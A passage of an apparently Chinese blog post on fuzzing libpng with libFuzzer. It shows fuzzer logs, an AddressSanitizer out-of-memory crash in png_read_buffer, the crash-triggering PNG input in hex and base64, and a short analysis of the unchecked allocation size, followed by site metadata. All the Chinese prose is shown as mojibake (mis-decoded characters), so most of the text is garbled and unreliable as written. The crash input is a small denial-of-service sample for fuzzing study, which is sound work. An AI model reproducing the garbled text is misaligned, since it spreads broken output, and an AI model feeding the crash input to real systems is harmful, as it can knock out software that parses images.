å•å…ƒå’Œè·å¾—crashçš„å¯èƒ½ã€‚æˆ‘ä½¿ç”¨workshopçš„#1ç¼–è¯‘æ–¹æ³•åœ¨ä½¿ç”¨dictçš„æƒ…å†µä¸‹covåªæœ‰40å¤šï¼Œä¹Ÿæœªèƒ½å¾—åˆ°crashï¼Œå› æ­¤ä¸Šé¢èƒ½å¾—åˆ°crashä¹Ÿå¾—ç›Šäºæˆ‘ä»¬çš„æ’æ¡©ç­–ç•¥ã€‚åœ¨æœªä½¿ç”¨è¯­æ–™åº“çš„æƒ…å†µä¸‹å°±å¾—åˆ°äº†crashå®å±æ„æ–™ä¹‹å¤–ï¼Œå¦‚æœæˆ‘ä»¬åœ¨ä½¿ç”¨å­—å…¸çš„ä¸‹æƒ…å†µä»ç„¶æš‚æ—¶æœªå¾—åˆ°crashï¼Œå¦ä¸€ä¸ªæ–¹æ³•å¯ä»¥å»å¯»æ‰¾ä¸€äº›æœ‰æ•ˆçš„è¾“å…¥è¯­æ–™åº“ã€‚å› ä¸ºlibfuzzeræ˜¯è¿›åŒ–å‹çš„fuzzï¼Œç»“åˆäº†äº§ç”Ÿå’Œå˜å¼‚ä¸¤ä¸ªå‘é¢ã€‚å¦‚æœæˆ‘ä»¬å¯ä»¥æä¾›ä¸€äº›å¥½çš„seedï¼Œè™½ç„¶å®ƒæœ¬èº«æ²¡æ³•é€ æˆç¨‹åºcrashï¼Œä½†libfuzzerä¼šåœ¨æ­¤åŸºç¡€ä¸Šè¿›è¡Œå˜å¼‚ï¼Œå°±æœ‰å¯èƒ½å˜å¼‚å‡ºæ›´å¥½çš„è¯­æ–™ï¼Œä»è€Œå¢å¤§ç¨‹åºcrashçš„æ¦‚ç‡ã€‚å…·ä½“çš„å˜å¼‚ç­–ç•¥éœ€è¦æˆ‘ä»¬å»é˜…è¯»libfuzzerçš„æºç æˆ–è€…äº›ç›¸å…³çš„è®ºæ–‡ã€‚workshopç»™æˆ‘ä»¬æä¾›äº†ä¸€äº›seedï¼š 1234567891011121314151617181920âœ 09 git:(master) âœ— ls seed_corpus anti_aliasing_perspective.png blue_yellow_alpha.png green.png offset_background_filter_1x.pnganti_aliasing.png blue_yellow_alpha_translate.png green_small.png offset_background_filter_2x.pngaxis_aligned.png blue_yellow_anti_aliasing.png green_small_with_blue_corner.png rotated_drop_shadow_filter_gl.pngbackground_filter_blur_off_axis.png blue_yellow_filter_chain.png green_with_blue_corner.png rotated_drop_shadow_filter_sw.pngbackground_filter_blur_outsets.png blue_yellow_flipped.png image_mask_of_layer.png rotated_filter_gl.pngbackground_filter_blur.png blue_yellow_partial_flipped.png intersecting_blue_green.png rotated_filter_sw.pngbackground_filter_on_scaled_layer_gl.png blue_yellow.png intersecting_blue_green_squares.png scaled_render_surface_layer_gl.pngbackground_filter_on_scaled_layer_sw.png blur_filter_with_clip_gl.png intersecting_blue_green_squares_video.png scaled_render_surface_layer_sw.pngbackground_filter.png blur_filter_with_clip_sw.png intersecting_light_dark_squares_video.png spiral_64_scale.pngbackground_filter_rotated_gl.png checkers_big.png mask_bottom_right.png spiral_double_scale.pngbackground_filter_rotated_sw.png checkers.png mask_middle.png spiral.pngblack.png dark_grey.png mask_of_background_filter.png white.pngblending_and_filter.png enlarged_texture_on_crop_offset.png mask_of_clipped_layer.png wrap_mode_repeat.pngblending_render_pass_cm.png enlarged_texture_on_threshold.png mask_of_layer.png yuv_stripes_alpha.pngblending_render_pass_mask_cm.png filter_with_giant_crop_rect.png mask_of_layer_with_blend.png yuv_stripes_clipped.pngblending_render_pass_mask.png force_anti_aliasing_off.png mask_of_replica_of_clipped_layer.png yuv_stripes_offset.pngblending_render_pass.png four_blue_green_checkers_linear.png mask_of_replica.png yuv_stripes.pngblending_transparent.png four_blue_green_checkers.png mask_with_replica_of_clipped_layer.png zoom_filter_gl.pngblending_with_root.png green_alpha.png mask_with_replica.png zoom_filter_sw.png ä½¿ç”¨seed_corpuså»fuzz: 123456789101112131415161718192021222324252627âœ 09 git:(master) âœ— ./libpng_read_fuzzer seed_corpus#502095 REDUCE cov: 626 ft: 2025 corp: 450/631Kb lim: 19944 exec/s: 4219 rss: 457Mb L: 821/19555 MS: 2 CMP-EraseBytes- DE: &quot;JDAT&quot;-#502951 REDUCE cov: 626 ft: 2025 corp: 450/630Kb lim: 19944 exec/s: 4226 rss: 457Mb L: 2710/19555 MS: 1 EraseBytes-#503447 REDUCE cov: 626 ft: 2025 corp: 450/630Kb lim: 19944 exec/s: 4230 rss: 457Mb L: 467/19555 MS: 1 EraseBytes-===================================================================26681==ERROR: AddressSanitizer: allocator is out of memory trying to allocate 0x60000008 bytes #0 0x51f69d in malloc /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:145:3 #1 0x5ad493 in png_read_buffer /home/admin/libfuzzer-workshop/lessons/09/libpng/pngrutil.c:310:16 #2 0x5ad493 in png_handle_sCAL /home/admin/libfuzzer-workshop/lessons/09/libpng/pngrutil.c:2323:13 #3 0x571a4c in png_read_info /home/admin/libfuzzer-workshop/lessons/09/libpng/pngread.c:200:10 #4 0x551b3a in LLVMFuzzerTestOneInput /home/admin/libfuzzer-workshop/lessons/09/libpng_read_fuzzer.cc:91:3 #5 0x459a21 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:553:15 #6 0x459265 in fuzzer::Fuzzer::RunOne(unsigned char const*, unsigned long, bool, fuzzer::InputInfo*, bool*) /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:469:3 #7 0x45b507 in fuzzer::Fuzzer::MutateAndTestOne() /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:695:19 #8 0x45c225 in fuzzer::Fuzzer::Loop(std::Fuzzer::vector&lt;fuzzer::SizedFile, fuzzer::fuzzer_allocator&lt;fuzzer::SizedFile&gt; &gt;&amp;) /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:831:5 #9 0x449fe8 in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerDriver.cpp:825:6 #10 0x473452 in main /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerMain.cpp:19:10 #11 0x7fc8e2ee1bf6 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21bf6)==26681==HINT: if you don't care about these errors you may set allocator_may_return_null=1SUMMARY: AddressSanitizer: out-of-memory /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:145:3 in malloc==26681==ABORTINGMS: 1 ChangeByte-; base unit: 7221de698a693628dcbac00aa34b38a2aca2a9050x89,0x50,0x4e,0x47,0xd,0xa,0x1a,0xa,0x0,0x0,0x0,0xd,0x49,0x48,0x44,0x52,0x0,0x0,0x0,0x27,0x0,0x0,0x0,0xc8,0x8,0x2,0x0,0x0,0x0,0x22,0x3a,0x39,0xc9,0x0,0x0,0x0,0x1,0x73,0x52,0x47,0x42,0x0,0xae,0xce,0x1c,0xe9,0x0,0x0,0x0,0x9,0x70,0x48,0x59,0x73,0x0,0x0,0xb,0x13,0x0,0x0,0xb,0x13,0x1,0x0,0x9a,0x9c,0x18,0x60,0x0,0x0,0x7,0x73,0x43,0x41,0x4c,0x7,0xdd,0xed,0x4,0x14,0x33,0x74,0x49,0x0,0x0,0x0,0x0,0xb7,0xba,0x47,0x42,0x60,0x82,\\x89PNG\\x0d\\x0a\\x1a\\x0a\\x00\\x00\\x00\\x0dIHDR\\x00\\x00\\x00'\\x00\\x00\\x00\\xc8\\x08\\x02\\x00\\x00\\x00\\&quot;:9\\xc9\\x00\\x00\\x00\\x01sRGB\\x00\\xae\\xce\\x1c\\xe9\\x00\\x00\\x00\\x09pHYs\\x00\\x00\\x0b\\x13\\x00\\x00\\x0b\\x13\\x01\\x00\\x9a\\x9c\\x18`\\x00\\x00\\x07sCAL\\x07\\xdd\\xed\\x04\\x143tI\\x00\\x00\\x00\\x00\\xb7\\xbaGB`\\x82artifact_prefix='./'; Test unit written to ./crash-110b2ad7102489b24efc4899bf7d9e55904eb83bBase64: iVBORw0KGgoAAAANSUhEUgAAACcAAADICAIAAAAiOjnJAAAAAXNSR0IArs4c6QAAAAlwSFlzAAALEwAACxMBAJqcGGAAAAdzQ0FMB93tBBQzdEkAAAAAt7pHQmCC ä¹Ÿé¡ºåˆ©å¾—åˆ°äº†crashï¼Œè¿™æ¬¡çš„crashå’Œä¸Šé¢çš„crashæœ‰æ‰€ä¸åŒï¼Œä¸Šé¢é€ æˆcrashæ—¶çš„covåªæœ‰293ï¼Œè€Œä¸”é€ æˆcrashçš„è¾“å…¥ä¸ºBase64: iVBORw0KGgoAAAANSUhEUgAAABAAAABjAQAAAAAEAEFBYkdLQXNQTFREQUFBQUG51ï¼Œè€Œä½¿ç”¨seedçš„è¯covè¾¾åˆ°äº†626ï¼Œè€Œä¸”é€ æˆcrashçš„æ•°æ®ä¸ºBase64: iVBORw0KGgoAAAANSUhEUgAAACcAAADICAIAAAAiOjnJAAAAAXNSR0IArs4c6QAAAAlwSFlzAAALEwAACxMBAJqcGGAAAAdzQ0FMB93tBBQzdEkAAAAAt7pHQmCCï¼Œè¦é•¿å¾ˆå¤šã€‚å¤šæ•°æƒ…å†µä¸‹æˆ‘ä»¬åŒæ—¶ä½¿ç”¨å­—å…¸å’Œè¯­æ–™åº“ï¼Œä»äº§ç”Ÿå’Œå˜å¼‚ä¸¤ä¸ªæ–¹é¢å»æé«˜æ ·ä¾‹çš„å¨åŠ›ï¼ŒåŒç®¡é½ä¸‹ã€‚ æ¥ä¸‹æ¥å°±è¦åˆ†æcrashçš„åŸå› äº†ï¼šERROR: AddressSanitizer: allocator is out of memory trying to allocate 0x60000008 bytesï¼Œæ€ä¹ˆæœ‰ç‚¹çœ¼ç†Ÿï¼Œå¥½åƒå’Œlesson 09çš„æŠ¥é”™ä¸€æ ·ã€‚ã€‚ä½†ä¹Ÿæœ‰æ‰€ä¸åŒï¼Œå®ƒå¯¹é”™è¯¯å®šä½åœ¨äº†in malloc /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:145:3ï¼Œè¿™ä¸ªæ˜¯åº•å±‚mallocçš„ä½ç½®ï¼ŒåŒæ—¶æœ‰ä¸ªhintï¼šif you don't care about these errors you may set allocator_may_return_null=1ï¼Œæç¤ºæˆ‘ä»¬è¿™ä¸ªcrashæ˜¯ç”±äºmallocç”³è¯·å¤±è´¥é€ æˆçš„ï¼Œä¹Ÿå°±æ˜¯/home/admin/libfuzzer-workshop/lessons/09/libpng/pngrutil.c:310:16å¤„çš„malloc: 12345678910111213141516171819if (buffer == NULL) { buffer = png_voidcast(png_bytep, png_malloc_base(png_ptr, new_size)); //æ­¤å¤„çš„png_malloc_base if (buffer != NULL) { png_ptr-&gt;read_buffer = buffer; png_ptr-&gt;read_buffer_size = new_size; } else if (warn &lt; 2) /* else silent */ { if (warn != 0) png_chunk_warning(png_ptr, &quot;insufficient memory to read chunk&quot;); else png_chunk_error(png_ptr, &quot;insufficient memory to read chunk&quot;); } } å®šä½åˆ°é—®é¢˜å‡ºåœ¨png_malloc_base(png_ptr, new_size)å¤„ï¼Œç”±äºæ²¡æœ‰å¯¹new_sizeçš„å¤§å°è¿›è¡Œä¸¥æ ¼é™åˆ¶å²›ä¸»åœ¨mallocæ—¶trying to allocate 0x60000008 byteså¯¼è‡´å¼‚å¸¸å´©æºƒã€‚ æ€»ç»“è¿™ä¸€ç¯‡æ“ä½œä¸‹æ¥æˆ‘æ„Ÿè§‰åˆ°å¯¹äºæé«˜libfuzzerçš„æ•ˆç‡åŒ…æ‹¬åœ¨ç¼–è¯‘æ’æ¡©ã€å­—å…¸ä½¿ç”¨ã€è¯­æ–™åº“é€‰æ‹©æ–¹é¢æœ‰äº†æ›´æ¸…æ¥šçš„è®¤è¯†ã€‚æ¨¡ç³Šæµ‹è¯•fuzzåœ¨è½¯ä»¶è¯ç”Ÿæ—¶å°±åº”è¿è€Œç”Ÿäº†ï¼Œç»è¿‡äº†å¦‚æ­¤é•¿æ—¶é—´çš„å‘å±•ï¼Œå¯¹äººä»¬å®ƒçš„ç ”ç©¶ä¹Ÿåœ¨ä¸æ–­æ·±å…¥ï¼Œå¹¶ä¸”æ ¹æ®ä¸åŒçš„éœ€æ±‚å¼€å‘å‡ºäº†å¾ˆå¤šä¸ªæ€§åŒ–çš„fuzzå·¥å…·ã€‚æ­£æ‰€è°“ç†è®ºç»“åˆå®è·µï¼Œè¦æƒ³å¯¹libfuzzeræœ‰æ›´æ·±å…¥çš„äº†è§£ï¼Œæˆ‘ä»¬è¿˜æ˜¯è¦å»åˆ†æå®ƒçš„æºç ï¼Œå‚è€ƒå„ç§ç ”ç©¶paperã€‚ åˆå­¦libfuzzerï¼Œæœ‰é”™è¯¯ç–å¿½ä¹‹å¤„çƒ¦è¯·å„ä½å¸ˆå‚…æŒ‡æ­£ã€‚","link":"/2020/12/22/libfuzzer(2)/"}],"tags":[{"name":"CTF","slug":"CTF","link":"/tags/CTF/"},{"name":"PWN","slug":"PWN","link":"/tags/PWN/"},{"name":"life","slug":"life","link":"/tags/life/"},{"name":"KERNEL","slug":"KERNEL","link":"/tags/KERNEL/"},{"name":"python","slug":"python","link":"/tags/python/"},{"name":"ARM_PWN","slug":"ARM-PWN","link":"/tags/ARM-PWN/"},{"name":"FUZZ","slug":"FUZZ","link":"/tags/FUZZ/"}],"categories":[]}